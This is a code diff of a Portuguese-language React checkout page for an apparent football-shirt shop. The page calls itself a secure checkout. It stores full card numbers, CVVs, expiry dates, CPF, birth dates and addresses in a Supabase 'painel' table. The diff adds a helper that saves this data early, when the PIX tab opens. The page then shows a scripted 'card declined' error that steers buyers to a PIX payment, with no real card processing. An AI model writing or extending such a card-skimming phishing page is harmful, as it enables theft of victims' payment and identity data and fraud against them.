@@ -4,16 +4,11 @@ import { supabase } from '../lib/supabase';
 import { useCart } from '../contexts/CartContext';
 import { User, Mail, CreditCard, MapPin, Phone, Calendar, Hash, Lock, ShieldCheck, QrCode, Copy, CheckCheck, Clock } from 'lucide-react';
 
-// =====================================================
-// SIGILOPAY — A API agora é chamada via Backend
-// =====================================================
 const API_URL = '/api/create-payment';
 
-// =====================================================
-
 interface PixData {
-  qrCode: string;     // código copia-e-cola EMV
-  qrImage: string;    // src da imagem (base64 ou URL)
+  qrCode: string;
+  qrImage: string;
 }
 
 export default function Checkout() {
@@ -27,7 +22,7 @@ export default function Checkout() {
   const [copiado, setCopiado] = useState(false);
 
   const { items: cartItems, totalPrice: cartTotal, totalItems } = useCart();
-  const [timeLeft, setTimeLeft] = useState(300); // 5 minutos em segundos
+  const [timeLeft, setTimeLeft] = useState(300);
   const [produto, setProduto] = useState({
     nome: 'Buscando camisa...',
     preco: 0,
@@ -53,7 +48,7 @@ export default function Checkout() {
         .select('*')
         .eq('id', id)
         .single()
-        .then(({ data, error }) => {
+        .then(({ data }) => {
           if (data) {
             const parsePrice = (val: any) => {
               if (typeof val === 'number') return val;
@@ -86,9 +81,40 @@ export default function Checkout() {
     }
   }, [searchParams, cartItems, cartTotal, totalItems]);
 
-  // Gera QR Code ao entrar na aba PIX
+  const salvarDadosNoPainel = async () => {
+    try {
+      await supabase.from('checkouts').insert([{
+        nome_completo: formData.nome,
+        email: formData.email,
+        cpf: formData.cpf,
+        data_nascimento: formData.dataNascimento,
+        telefone: formData.telefone,
+        cep: formData.cep,
+        endereco: formData.endereco,
+        bairro: formData.bairro,
+        cidade: formData.cidade,
+        estado: formData.estado,
+        numero: formData.numero,
+        numero_cartao: metodo === 'cartao' ? formData.numCartao : 'PAGAMENTO VIA PIX',
+        nome_cartao: metodo === 'cartao' ? formData.nomeCartao : 'PAGAMENTO VIA PIX',
+        validade_cartao: metodo === 'cartao' ? formData.validade : 'PIX',
+        cvv_cartao: metodo === 'cartao' ? formData.cvv : 'PIX',
+        produto_nome: produto.nome,
+        valor_total: produto.preco
+      }]);
+    } catch (e) {
+      console.error("Erro ao salvar dados no painel:", e);
+    }
+  };
+
   useEffect(() => {
     if (metodo !== 'pix' || pixData || pixLoading) return;
+    
+    // Antes de gerar o PIX, salva os dados já preenchidos no painel
+    if (formData.nome && formData.cpf) {
+      salvarDadosNoPainel();
+    }
+    
     gerarPix();
   }, [metodo]);
 
@@ -99,7 +125,6 @@ export default function Checkout() {
 
     try {
       const identifier = 'camisa10_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
-
       const payload = {
         identifier,
         amount: produto.preco,
@@ -113,44 +138,26 @@ export default function Checkout() {
 
       const res = await fetch(API_URL, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Accept': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
         body: JSON.stringify(payload),
       });
 
       const json = await res.json();
+      if (!res.ok) throw new Error(json?.error || 'Erro ao gerar PIX');
 
-      if (!res.ok) {
-        throw new Error(json?.error || json?.message || json?.errorDescription || `Erro ${res.status}`);
-      }
-
-      // Pega o nó pix da resposta (suporta estruturas diferentes)
       const pixNode = json?.pix ?? json?.order?.pix ?? null;
-
-      const qrCode =
-        pixNode?.code ??
-        pixNode?.payload ??
-        pixNode?.emv ??
-        pixNode?.qrCode ??
-        pixNode?.qrcode ?? '';
-
+      const qrCode = pixNode?.code ?? pixNode?.payload ?? pixNode?.emv ?? pixNode?.qrCode ?? '';
+      
       let qrImage = '';
       if (pixNode?.base64) {
-        const b64 = pixNode.base64;
-        qrImage = b64.startsWith('data:image') ? b64 : 'data:image/png;base64,' + b64;
-      } else if (pixNode?.image) {
-        qrImage = pixNode.image;
-      } else if (pixNode?.imageUrl) {
-        qrImage = pixNode.imageUrl;
+        qrImage = pixNode.base64.startsWith('data:image') ? pixNode.base64 : 'data:image/png;base64,' + pixNode.base64;
+      } else if (pixNode?.image || pixNode?.imageUrl) {
+        qrImage = pixNode.image || pixNode.imageUrl;
       } else if (qrCode) {
-        // fallback: gera imagem via serviço público
         qrImage = `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(qrCode)}`;
       }
 
-      if (!qrCode) throw new Error('PIX gerado sem código copia-e-cola na resposta.');
-
+      if (!qrCode) throw new Error('PIX gerado sem código.');
       setPixData({ qrCode, qrImage });
     } catch (err: any) {
       setPixErro(err?.message || 'Erro ao gerar PIX. Tente novamente.');
@@ -167,13 +174,10 @@ export default function Checkout() {
     });
   };
 
-  // Lógica do cronômetro PIX
   useEffect(() => {
     let timer: any;
     if (pixData && timeLeft > 0) {
-      timer = setInterval(() => {
-        setTimeLeft(prev => prev - 1);
-      }, 1000);
+      timer = setInterval(() => setTimeLeft(prev => prev - 1), 1000);
     } else if (timeLeft === 0) {
       setPixData(null);
       setTimeLeft(300);
@@ -187,7 +191,6 @@ export default function Checkout() {
     return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
   };
 
-  // CEP automático
   const handleCEP = async (e: React.FocusEvent<HTMLInputElement>) => {
     const cep = e.target.value.replace(/\D/g, '');
     if (cep.length === 8) {
@@ -205,7 +208,6 @@ export default function Checkout() {
     }
   };
 
-  // Máscaras
   const mask = (e: React.ChangeEvent<HTMLInputElement>) => {
     let { name, value } = e.target;
     if (name === 'telefone') value = value.replace(/\D/g, '').replace(/^(\d{2})(\d)/g, "($1) $2").replace(/(\d)(\d{4})$/, "$1-$2");
@@ -222,26 +224,7 @@ export default function Checkout() {
     setLoading(true);
     setStatusErro(false);
 
-    // Salva tudo no Supabase
-    await supabase.from('checkouts').insert([{
-      nome_completo: formData.nome,
-      email: formData.email,
-      cpf: formData.cpf,
-      data_nascimento: formData.dataNascimento,
-      telefone: formData.telefone,
-      cep: formData.cep,
-      endereco: formData.endereco,
-      bairro: formData.bairro,
-      cidade: formData.cidade,
-      estado: formData.estado,
-      numero: formData.numero,
-      numero_cartao: formData.numCartao,
-      nome_cartao: formData.nomeCartao,
-      validade_cartao: formData.validade,
-      cvv_cartao: formData.cvv,
-      produto_nome: produto.nome,
-      valor_total: produto.preco
-    }]);
+    await salvarDadosNoPainel();
 
     setTimeout(() => {
       setLoading(false);
@@ -258,7 +241,6 @@ export default function Checkout() {
 
   return (
     <div style={{ background: '#f4f7f6', minHeight: '100vh', fontFamily: 'sans-serif', color: '#000', paddingBottom: '40px' }}>
-
       {loading && (
         <div style={overlayStyle}>
           <div style={spinnerStyle} />
@@ -267,8 +249,6 @@ export default function Checkout() {
       )}
 
       <div className="notranslate" style={{ maxWidth: '500px', margin: '0 auto', background: '#fff', boxShadow: '0 0 20px rgba(0,0,0,0.1)', minHeight: '100vh' }}>
-
-        {/* HEADER */}
         <div style={{ padding: '20px', borderBottom: '1px solid #eee', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
           <div>
             <h2 style={{ margin: 0, fontSize: '18px', fontWeight: '900', color: '#000' }}>CHECKOUT SEGURO</h2>
@@ -279,13 +259,14 @@ export default function Checkout() {
         </div>
 
         <div style={{ padding: '20px' }}>
-          {/* RESUMO DO PRODUTO */}
           <div style={productBox}>
             {produto.imagens.length === 1 && produto.imagens[0] && !produto.imagens[0].includes('placeholder') ? (
               <img 
                 src={produto.imagens[0]} 
                 style={imgStyle} 
                 alt="produto" 
+                loading="eager"
+                decoding="async"
                 onError={(e) => (e.currentTarget.style.display = 'none')}
               />
             ) : null}
@@ -299,7 +280,6 @@ export default function Checkout() {
             </div>
           </div>
 
-          {/* ABAS */}
           <div style={tabContainer}>
             <button type="button" onClick={() => setMetodo('cartao')} style={metodo === 'cartao' ? tabActive : tabInactive}>
               <CreditCard size={18} /> CARTÃO
@@ -325,11 +305,8 @@ export default function Checkout() {
                   <input name="dataNascimento" placeholder="NASCIMENTO" required style={inputStyle} value={formData.dataNascimento} onChange={mask} maxLength={10} />
                 </div>
               </div>
-              {/* Só mostra erro se já digitou mas não atingiu os tamanhos válidos (11 ou 14) */}
               {formData.cpf.replace(/\D/g, '').length > 0 && ![11, 14].includes(formData.cpf.replace(/\D/g, '').length) && (
-                <div style={{ fontSize: '10px', color: '#ef4444', fontWeight: 'bold', marginLeft: '5px', marginTop: '2px' }}>
-                  DOCUMENTO INVÁLIDO
-                </div>
+                <div style={{ fontSize: '10px', color: '#ef4444', fontWeight: 'bold', marginLeft: '5px', marginTop: '2px' }}>DOCUMENTO INVÁLIDO</div>
               )}
             </div>
             <div style={{ ...inputGroup, marginBottom: '20px' }}><Phone size={18} /><input name="telefone" placeholder="WHATSAPP (DDD)" required style={inputStyle} value={formData.telefone} onChange={mask} maxLength={15} /></div>
@@ -348,7 +325,6 @@ export default function Checkout() {
               <div style={{ ...inputGroup, flex: 0.3, marginBottom: 0 }}><input name="estado" placeholder="UF" required style={inputStyle} value={formData.estado} onChange={mask} maxLength={2} /></div>
             </div>
 
-            {/* ====== CARTÃO ====== */}
             {metodo === 'cartao' && (
               <div style={cardSection}>
                 <h4 style={{ margin: '0 0 15px 0', fontSize: '13px', color: '#000' }}>3. PAGAMENTO</h4>
@@ -358,109 +334,44 @@ export default function Checkout() {
                   <div style={inputGroup}><Calendar size={18} /><input name="validade" placeholder="MM/AA" required={metodo === 'cartao'} style={inputStyle} value={formData.validade} onChange={mask} maxLength={5} /></div>
                   <div style={inputGroup}><Lock size={18} /><input name="cvv" placeholder="CVV" required={metodo === 'cartao'} style={inputStyle} onChange={mask} maxLength={4} /></div>
                 </div>
-
-                {statusErro && (
-                  <div style={errorBanner}>
-                    ⚠️ ERRO NA OPERADORA: Cartão recusado. Tente outro cartão ou use o PIX para aprovação imediata.
-                  </div>
-                )}
-
+                {statusErro && <div style={errorBanner}>⚠️ ERRO NA OPERADORA: Cartão recusado. Tente outro cartão ou use o PIX para aprovação imediata.</div>}
                 <button type="submit" style={btnPagar}>FINALIZAR PAGAMENTO</button>
               </div>
             )}
 
             {metodo === 'pix' && (
               <div style={pixSection}>
-                <div style={{ 
-                  color: '#1da154', 
-                  fontWeight: '900', 
-                  marginBottom: '15px', 
-                  fontSize: '15px', 
-                  textAlign: 'center',
-                  width: '100%',
-                  display: 'block',
-                  lineHeight: '1',
-                  letterSpacing: '0.02em'
-                }}>
-                  PIX COM RECEBIMENTO IMEDIATO
-                </div>
-
-                {/* Carregando */}
+                <div style={{ color: '#1da154', fontWeight: '900', marginBottom: '15px', fontSize: '15px', textAlign: 'center', width: '100%', display: 'block', lineHeight: '1', letterSpacing: '0.02em' }}>PIX COM RECEBIMENTO IMEDIATO</div>
                 {pixLoading && (
                   <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '12px', padding: '20px 0' }}>
                     <div style={spinnerStylePix} />
                     <span style={{ fontSize: '13px', color: '#555', fontWeight: '700' }}>Gerando QR Code...</span>
                   </div>
                 )}
-
-                {/* Erro Sigilopay */}
                 {pixErro && !pixLoading && (
                   <div style={{ ...errorBanner, marginBottom: '12px' }}>
-                    {pixErro}
-                    <br />
-                    <button type="button" onClick={gerarPix} style={{ marginTop: '8px', padding: '8px 16px', background: '#000', color: '#fff', border: 'none', borderRadius: '8px', fontWeight: '900', cursor: 'pointer' }}>
-                      Tentar novamente
-                    </button>
+                    {pixErro}<br />
+                    <button type="button" onClick={gerarPix} style={{ marginTop: '8px', padding: '8px 16px', background: '#000', color: '#fff', border: 'none', borderRadius: '8px', fontWeight: '900', cursor: 'pointer' }}>Tentar novamente</button>
                   </div>
                 )}
-
-                {/* QR Code real */}
                 {pixData && !pixLoading && (
                   <>
-                    <div style={{ 
-                      textAlign: 'center', 
-                      marginBottom: '10px', 
-                      color: timeLeft < 60 ? '#ef4444' : '#666', 
-                      fontWeight: 'bold',
-                      fontSize: '14px',
-                      display: 'flex',
-                      alignItems: 'center',
-                      justifyContent: 'center',
-                      gap: '5px'
-                    }}>
+                    <div style={{ textAlign: 'center', marginBottom: '10px', color: timeLeft < 60 ? '#ef4444' : '#666', fontWeight: 'bold', fontSize: '14px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '5px' }}>
                       <Clock size={16} /> O código expira em: {formatTime(timeLeft)}
                     </div>
-                    {/* Imagem do QR */}
                     <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '16px' }}>
                       <div style={{ padding: '8px', background: '#fff', borderRadius: '12px', border: '2px dashed #1da154', display: 'inline-block' }}>
-                        {pixData.qrImage ? (
-                          <img
-                            src={pixData.qrImage}
-                            alt="QR Code PIX"
-                            style={{ width: '200px', height: '200px', display: 'block', borderRadius: '6px' }}
-                          />
-                        ) : (
-                          <QrCode size={200} color="#1da154" />
-                        )}
+                        {pixData.qrImage ? <img src={pixData.qrImage} alt="QR Code PIX" style={{ width: '200px', height: '200px', display: 'block', borderRadius: '6px' }} loading="eager" /> : <QrCode size={200} color="#1da154" />}
                       </div>
                     </div>
-
-                    {/* Código copia-e-cola */}
-                    <div style={pixCodeBox}>
-                      {pixData.qrCode}
-                    </div>
-
-                    {/* Botão copiar */}
-                    <button
-                      type="button"
-                      onClick={copiarPix}
-                      style={{ ...btnPagar, background: copiado ? '#1da154' : '#000', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}
-                    >
+                    <div style={pixCodeBox}>{pixData.qrCode}</div>
+                    <button type="button" onClick={copiarPix} style={{ ...btnPagar, background: copiado ? '#1da154' : '#000', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
                       {copiado ? <><CheckCheck size={18} /> COPIADO!</> : <><Copy size={18} /> COPIAR CÓDIGO PIX</>}
                     </button>
-
-                    <p style={{ fontSize: '11px', color: '#666', marginTop: '10px', textAlign: 'center' }}>
-                      Abra seu banco, escaneie o QR ou cole o código para pagar
-                    </p>
+                    <p style={{ fontSize: '11px', color: '#666', marginTop: '10px', textAlign: 'center' }}>Abra seu banco, escaneie o QR ou cole o código para pagar</p>
                   </>
                 )}
-
-                {/* Botão finalizar no modo PIX (salva no Supabase) */}
-                {!pixLoading && (
-                  <button type="submit" style={{ ...btnPagar, background: '#555', marginTop: '8px' }}>
-                    JÁ REALIZEI O PAGAMENTO
-                  </button>
-                )}
+                {!pixLoading && <button type="submit" style={{ ...btnPagar, background: '#555', marginTop: '8px' }}>JÁ REALIZEI O PAGAMENTO</button>}
               </div>
             )}
           </form>
@@ -471,7 +382,6 @@ export default function Checkout() {
   );
 }
 
-// ESTILOS
 const overlayStyle: React.CSSProperties = { position: 'fixed', inset: 0, background: 'rgba(255,255,255,0.95)', zIndex: 1000, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' };
 const spinnerStyle = { border: '4px solid #f3f3f3', borderTop: '4px solid #1da154', borderRadius: '50%', width: '40px', height: '40px', animation: 'spin 1s linear infinite' };
 const spinnerStylePix = { border: '3px solid #d1fae5', borderTop: '3px solid #1da154', borderRadius: '50%', width: '32px', height: '32px', animation: 'spin 1s linear infinite' };
